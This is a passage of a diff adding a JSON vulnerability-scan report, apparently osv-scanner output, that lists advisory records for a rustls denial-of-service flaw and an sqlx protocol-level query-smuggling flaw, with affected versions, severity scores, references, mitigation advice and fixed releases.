+                          "introduced": "0.0.0-0"
+                        },
+                        {
+                          "fixed": "0.21.11"
+                        },
+                        {
+                          "introduced": "0.22.0"
+                        },
+                        {
+                          "fixed": "0.22.4"
+                        },
+                        {
+                          "introduced": "0.23.0"
+                        },
+                        {
+                          "fixed": "0.23.5"
+                        }
+                      ]
+                    }
+                  ],
+                  "database_specific": {
+                    "categories": [
+                      "denial-of-service"
+                    ],
+                    "cvss": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+                    "informational": null,
+                    "source": "https://github.com/rustsec/advisory-db/blob/osv/crates/RUSTSEC-2024-0336.json"
+                  },
+                  "ecosystem_specific": {
+                    "affected_functions": null,
+                    "affects": {
+                      "arch": [],
+                      "functions": [
+                        "rustls::ConnectionCommon::complete_io"
+                      ],
+                      "os": []
+                    }
+                  }
+                }
+              ],
+              "severity": [
+                {
+                  "type": "CVSS_V3",
+                  "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+                }
+              ],
+              "references": [
+                {
+                  "type": "PACKAGE",
+                  "url": "https://crates.io/crates/rustls"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://rustsec.org/advisories/RUSTSEC-2024-0336.html"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://github.com/rustls/rustls/security/advisories/GHSA-6g7w-8wpp-frhj"
+                }
+              ],
+              "database_specific": {
+                "license": "CC0-1.0"
+              }
+            }
+          ],
+          "groups": [
+            {
+              "ids": [
+                "GHSA-6g7w-8wpp-frhj",
+                "RUSTSEC-2024-0336"
+              ],
+              "aliases": [
+                "CVE-2024-32650",
+                "GHSA-6g7w-8wpp-frhj",
+                "RUSTSEC-2024-0336"
+              ],
+              "max_severity": "7.5"
+            }
+          ]
+        },
+        {
+          "package": {
+            "name": "sqlx",
+            "version": "0.7.4",
+            "ecosystem": "crates.io"
+          },
+          "vulnerabilities": [
+            {
+              "modified": "2024-08-26T14:12:11Z",
+              "published": "2024-08-19T16:02:04Z",
+              "schema_version": "1.6.0",
+              "id": "GHSA-xmrp-424f-vfpx",
+              "summary": "SQLx Binary Protocol Misinterpretation caused by Truncating or Overflowing Casts",
+              "details": "The following presentation at this year's DEF CON was brought to our attention on the SQLx Discord:\n\n\u003e SQL Injection isn't Dead: Smuggling Queries at the Protocol Level  \n\u003e \u003chttp://web.archive.org/web/20240812130923/https://media.defcon.org/DEF%20CON%2032/DEF%20CON%2032%20presentations/DEF%20CON%2032%20-%20Paul%20Gerste%20-%20SQL%20Injection%20Isn't%20Dead%20Smuggling%20Queries%20at%20the%20Protocol%20Level.pdf\u003e  \n\u003e (Archive link for posterity.)\n\nEssentially, encoding a value larger than 4GiB can cause the length prefix in the protocol to overflow, \ncausing the server to interpret the rest of the string as binary protocol commands or other data.\n\nIt appears SQLx _does_ perform truncating casts in a way that could be problematic, \nfor example: \u003chttps://github.com/launchbadge/sqlx/blob/6f2905695b9606b5f51b40ce10af63ac9e696bb8/sqlx-postgres/src/arguments.rs#L163\u003e\n\nThis code has existed essentially since the beginning, \nso it is reasonable to assume that all published versions `\u003c= 0.8.0` are affected.\n\n## Mitigation\n\nAs always, you should make sure your application is validating untrustworthy user input. \nReject any input over 4 GiB, or any input that could _encode_ to a string longer than 4 GiB. \nDynamically built queries are also potentially problematic if it pushes the message size over this 4 GiB bound.\n\n[`Encode::size_hint()`](https://docs.rs/sqlx/latest/sqlx/trait.Encode.html#method.size_hint) \ncan be used for sanity checks, but do not assume that the size returned is accurate. \nFor example, the `Json\u003cT\u003e` and `Text\u003cT\u003e` adapters have no reasonable way to predict or estimate the final encoded size, \nso they just return `size_of::\u003cT\u003e()` instead.\n\nFor web application backends, consider adding some middleware that limits the size of request bodies by default.\n\n## Resolution\n\nWork has started on a branch to add `#[deny]` directives for the following Clippy lints:\n\n* [`cast_possible_truncation`](https://rust-lang.github.io/rust-clippy/master/#/cast_possible_truncation)\n* [`cast_possible_wrap`](https://rust-lang.github.io/rust-clippy/master/#/cast_possible_wrap)\n* [`cast_sign_loss`](https://rust-lang.github.io/rust-clippy/master/#/cast_sign_loss)\n\nand to manually audit the code that they flag.\n\nA fix is expected to be included in the `0.8.1` release (still WIP as of writing).\n",
+              "affected": [
+                {
+                  "package": {
+                    "ecosystem": "crates.io",
+                    "name": "sqlx",
+                    "purl": "pkg:cargo/sqlx"
+                  },
+                  "ranges": [
+                    {
+                      "type": "SEMVER",
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "0.8.1"
+                        }
+                      ]
+                    }
+                  ],
+                  "database_specific": {
+                    "last_known_affected_version_range": "\u003c= 0.8.0",
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/08/GHSA-xmrp-424f-vfpx/GHSA-xmrp-424f-vfpx.json"
+                  }
+                }
+              ],
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/launchbadge/sqlx/issues/3440"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/launchbadge/sqlx"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/launchbadge/sqlx/blob/6f2905695b9606b5f51b40ce10af63ac9e696bb8/sqlx-postgres/src/arguments.rs#L163"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://rustsec.org/advisories/RUSTSEC-2024-0363.html"
+                }
+              ],
+              "database_specific": {
+                "cwe_ids": [],
+                "github_reviewed": true,
+                "github_reviewed_at": "2024-08-19T16:02:04Z",
+                "nvd_published_at": null,
+                "severity": "MODERATE"
+              }
+            },
+            {
+              "modified": "2024-08-24T14:46:16Z",
+              "published": "2024-08-15T12:00:00Z",
+              "schema_version": "1.6.0",
+              "id": "RUSTSEC-2024-0363",
+              "summary": "Binary Protocol Misinterpretation caused by Truncating or Overflowing Casts",
+              "details": "The following presentation at this year's DEF CON was brought to our attention on the SQLx Discord:\n\n\u003e SQL Injection isn't Dead: Smuggling Queries at the Protocol Level  \n\u003e \u003chttp://web.archive.org/web/20240812130923/https://media.defcon.org/DEF%20CON%2032/DEF%20CON%2032%20presentations/DEF%20CON%2032%20-%20Paul%20Gerste%20-%20SQL%20Injection%20Isn't%20Dead%20Smuggling%20Queries%20at%20the%20Protocol%20Level.pdf\u003e  \n\u003e (Archive link for posterity.)\n\nEssentially, encoding a value larger than 4GiB can cause the length prefix in the protocol to overflow, \ncausing the server to interpret the rest of the string as binary protocol commands or other data.\n\nIt appears SQLx _does_ perform truncating casts in a way that could be problematic, \nfor example: \u003chttps://github.com/launchbadge/sqlx/blob/6f2905695b9606b5f51b40ce10af63ac9e696bb8/sqlx-postgres/src/arguments.rs#L163\u003e\n\nThis code has existed essentially since the beginning, \nso it is reasonable to assume that all published versions `\u003c= 0.8.0` are affected.\n\n## Mitigation\n\nAs always, you should make sure your application is validating untrustworthy user input. \nReject any input over 4 GiB, or any input that could _encode_ to a string longer than 4 GiB. \nDynamically built queries are also potentially problematic if it pushes the message size over this 4 GiB bound.\n\n[`Encode::size_hint()`](https://docs.rs/sqlx/latest/sqlx/trait.Encode.html#method.size_hint) \ncan be used for sanity checks, but do not assume that the size returned is accurate. \nFor example, the `Json\u003cT\u003e` and `Text\u003cT\u003e` adapters have no reasonable way to predict or estimate the final encoded size, \nso they just return `size_of::\u003cT\u003e()` instead.\n\nFor web application backends, consider adding some middleware that limits the size of request bodies by default.\n\n## Resolution\n\n`sqlx 0.8.1` has been released with the fix: \u003chttps://github.com/launchbadge/sqlx/blob/main/CHANGELOG.md#081---2024-08-23\u003e\n\nPostgres users are advised to upgrade ASAP as a possible exploit has been demonstrated:\n\u003chttps://github.com/launchbadge/sqlx/issues/3440#issuecomment-2307956901\u003e\n\nMySQL and SQLite do not _appear_ to be exploitable, but upgrading is recommended nonetheless.",
+              "affected": [
+                {
+                  "package": {
+                    "ecosystem": "crates.io",
+                    "name": "sqlx",
+                    "purl": "pkg:cargo/sqlx"
+                  },
+                  "ranges": [
+                    {
+                      "type": "SEMVER",
+                      "events": [
+                        {
+                          "introduced": "0.0.0-0"
+                        },
+                        {
+                          "fixed": "0.8.1"
+                        }
+                      ]
+                    }
+                  ],
+                  "database_specific": {
+                    "categories": [
+                      "format-injection"
+                    ],
+                    "cvss": null,
+                    "informational": null,
+                    "source": "https://github.com/rustsec/advisory-db/blob/osv/crates/RUSTSEC-2024-0363.json"
+                  },
+                  "ecosystem_specific": {
+                    "affected_functions": null,
+                    "affects": {
+                      "arch": [],
+                      "functions": [],
+                      "os": []
+                    }
+                  }
+                }
+              ],
+              "references": [
+                {
+                  "type": "PACKAGE",
+                  "url": "https://crates.io/crates/sqlx"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://rustsec.org/advisories/RUSTSEC-2024-0363.html"
+                },
+                {
+                  "type": "REPORT",
+                  "url": "https://github.com/launchbadge/sqlx/issues/3440"
+                }
+              ],
+              "database_specific": {
+                "license": "CC0-1.0"
+              }
+            }
+          ],
+          "groups": [
+            {
+              "ids": [
+                "GHSA-xmrp-424f-vfpx"
+              ],
+              "aliases": [
+                "GHSA-xmrp-424f-vfpx"
+              ],
+              "max_severity": ""
+            },
+            {
+              "ids": [
+                "RUSTSEC-2024-0363"
+              ],
+              "aliases": [
+                "RUSTSEC-2024-0363"
+              ],
+              "max_severity": ""
+            }
+          ]
+        }
+      ]
+    }
+  ],
+  "experimental_config": {
+    "licenses": {
+      "summary": false,
+      "allowlist": null
+    }
+  }
+}
